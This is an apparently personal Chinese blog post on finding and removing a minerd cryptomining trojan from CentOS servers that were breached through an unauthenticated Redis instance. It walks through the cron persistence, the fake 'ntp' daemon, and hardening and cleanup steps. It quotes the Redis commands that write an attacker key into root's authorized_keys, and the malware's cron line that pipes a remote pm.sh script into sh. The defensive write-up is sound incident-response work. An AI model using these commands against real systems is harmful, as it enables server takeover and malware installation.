---
title: 彻底清除Linux centos minerd木马
categories:
  - 错误集锦
tags:
  - redis
date: 2016-10-26 22:41:19
---

>前几天，公司两台linux服务器，一台访问速度很慢，cpu跑满，一台免密码登录失效，公钥文件被改写成redis的key。用htop命令查询发现了minerd木马进程，初步猜测是redis没有配访问权限造成的。网上查询minerd木马，发现这是一个很常见的挖矿程序，相关猜测也得到了验证。

下文是网上搜索到的清除minerd木马方法。

## 现状描述
1、top可以看到，这个minerd 程序把cpu跑满了

![1.jpg](1.jpg)
2、ps aux | grep minerd
可知是这个程序: /opt/minerd

<!-- more -->

这个不是我们自己启动的，可以断定服务器被黑了
这个进程是root用户启动的，代码有漏洞可能性不大（web服务是www用户启动的），多半黑客已经登录服务器了

![2.jpg](2.jpg)
3、有可能是免密登录了，去/root/.ssh 目录下，并没有发现authorized_keys，但发现了KHK75NEOiq这个文件

查看 vim KHK75NEOiq
可以看到内容就是免密码登录的公钥

![3.jpg](3.jpg)
4、在ssh的配置文件/etc/ssh/sshd_config中也可以看到把AuthorizedKeysFile指向了这个文件了（.ssh/KHK75NEOiq）

猜想是这样的：通过authorized_keys免密码登录后，在这个目录下创建了KHK75NEOiq这个文件，修改了AuthorizedKeysFile的指向，就把authorized_keys这个文件删除了。

![4.jpg](4.jpg)
5、那么是写进来authorized_keys的那？

之前我处理过类似的问题，是redis未授权导致的，也就是说外网可以直接不用密码登录我的redis, 连上redis后，通过以下命令即可创建文件：

<font style="color:red">**config set dir /root/.ssh
config set dbfilename authorized_keys
set key value，其中value为生成公钥，即可将公钥保存在服务器，使得登录时不需要输入账号与密码。**</font>

<br/>

---

## 先堵住免登录漏洞
1、修改ssh端口
编辑/etc/ssh/sshd_config文件中的Port 22将22修改为其他端口

2、禁止root用户登陆
编辑/etc/ssh/sshd_config文件中的PermitRootLogin 修改为no

3、修改无密码登陆的文件路径
编辑/etc/ssh/sshd_config文件中的AuthorizedKeysFile 修改为其他文件路径

4、删除 .ssh下的 KHK75NEOiq

5、不让外网直接连接
在 redis.conf 文件中找到#bind 127.0.0.1，把前面的#号去掉，重启

---

## 找到木马守护进程
1、通常直接kill掉进程，是不好使的，肯定有守护进程，还有系统自启动，所以清理步骤是这样的：
1）干掉守护进程
2）干掉系统自启动
3）干掉木马进程

找到木马守护进程并干掉

守护进程有大概有两种存在形式，crontab 和常驻进程，常驻进程得慢慢分析，我们先看crontab，有一条不是我创建的任务。任务是：直接从远程下载一个脚本pm.sh 并执行。

![5.jpg](5.jpg)

2、我们来看看这个脚本

![6.jpg](6.jpg)

3、大致逻辑是这样的：
1）把 */10 * * * * curl -fsSL http://r.chanstring.com/pm.sh?0706 | sh 写入crontab
2）把authorized_keys删掉，并创建免登录文件/root/.ssh/KHK75NEOiq，修改ssh配置重启
3）curl下载/opt/KHK75NEOiq33 这个文件，并执行安装（/opt/KHK75NEOiq33 --Install），然后启动ntp

4、基本可以断定这个ntp就是守护进程，但看到ntp真的有些怕怕，ntp不是搞时间同步的吗，其实 Linux正常的ntp服务叫ntpd，并非ntp，很有迷惑性啊

![7.jpg](7.jpg)

5、但为了让自己放心，还是校验了一番
我们先从时间上校验，ntp是不是木马任务后创建的

查看这个木马任务第一次执行的时间
去/var/log下看cron的日志

![8.jpg](8.jpg)

6、Jul 24 09:23:01 第一次执行： curl -L http://r.chanstring.com/pm.sh?0703
Jul 24 09:30:01 第一次我们目前crontab里的任务：curl -fsSL http://r.chanstring.com/pm.sh?0706
Jul 24 09:49 脚本/etc/init.d/ntp的创建时间

从pm.sh这个脚本可知 curl下来/opt/KHK75NEOiq33这个文件，并执行安装 /opt/KHK75NEOiq33 --Install 比较耗时间，我执行了一下，在我的机器上是10多分钟。

所以创建时间上基本吻合

![9.jpg](9.jpg)

7、我们看一下ntp的随系统启动
runlevel 2 3 4 5都启动了，够狠的呀

![10.jpg](10.jpg)

8、看一下常用的3吧
可以看到 有个S50ntp 软链了脚本/etc/init.d/ntp

![11.jpg](11.jpg)

9、我们查看系统启动日志
vim /var/log/boot.log
有一条是Staring S50ntp，这个基本对应脚本/etc/init.d/ntp 中的 echo "Starting $name"

![12.jpg](12.jpg)

10、我们来看一下 /etc/init.d/ntp 这个脚本
$name应该就对应的值是 S50ntp，通过stdout_log,stderr_log,pid_file也得到了验证。

![13.jpg](13.jpg)

11、通过搜索安装文件（/opt/KHK75NEOiq33），可知看到 /opt/KHK75NEOiq33 --Install的过程中写入了ntp脚本 自启动 /opt/minerd等一系列的操作。

![14.jpg](14.jpg)

12、打开 /usr/local/etc/minerd.conf，内容就是/opt/minerd这个进程后的一些参数

![15.jpg](15.jpg)

13、好了 验证完毕，可以干掉这个ntp了

---

## 清理木马
1、去掉crontab文件中的有关木马内容：
/var/spool/cron/crontabs/root
/var/spool/cron/root

2、干掉守护进程ntp，并删除相关文件

![16.jpg](16.jpg)
![17.jpg](17.jpg)

3、干掉木马进程及其文件

![18.jpg](18.jpg)

4、干掉安装文件及免密登录的文件

![19.jpg](19.jpg)

5、干掉随系统启动的文件

![20.jpg](20.jpg)

6、top一下 一切都正常了！

![21.jpg](21.jpg)

7、重启一下，也没问题了

![22.jpg](22.jpg)